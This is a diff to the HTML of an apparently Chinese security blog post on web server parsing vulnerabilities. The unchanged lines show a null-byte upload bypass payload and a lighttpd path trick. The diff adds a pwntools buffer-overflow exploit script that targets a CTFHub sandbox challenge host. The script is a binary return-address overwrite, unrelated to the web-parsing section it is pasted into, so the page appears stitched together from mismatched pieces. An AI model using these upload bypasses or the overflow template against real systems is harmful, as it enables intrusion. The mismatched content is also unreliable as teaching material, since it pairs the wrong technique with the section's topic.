@@ -486,6 +486,20 @@ PHP解析进程从前往后看，到html为止，后面相当于null，解析执
 <p><img src="https://img-blog.csdnimg.cn/29e141c422e64406a12764ae4aea8fed.png" alt="在这里插入图片描述"></p>
 <h3 id="4-2-2-利用："><a href="#4-2-2-利用：" class="headerlink" title="4.2.2 利用："></a>4.2.2 利用：</h3><pre><code>Hack.html%00.php
 </code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+
+host<span class="token operator">=</span><span class="token string">'challenge-ecc49a4433ea7faa.sandbox.ctfhub.com'</span>
+port<span class="token operator">=</span><span class="token number">39488</span>
+io<span class="token operator">=</span>connect<span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
+
+padding<span class="token operator">=</span><span class="token number">0x78</span>
+return_addr<span class="token operator">=</span><span class="token number">0x4007b8</span>
+payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span>padding<span class="token punctuation">,</span>return_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
 <h1 id="5-lighttpd解析漏洞"><a href="#5-lighttpd解析漏洞" class="headerlink" title="5.lighttpd解析漏洞"></a>5.lighttpd解析漏洞</h1><p><code>xx.jpg/xx.php</code></p>
 
                 
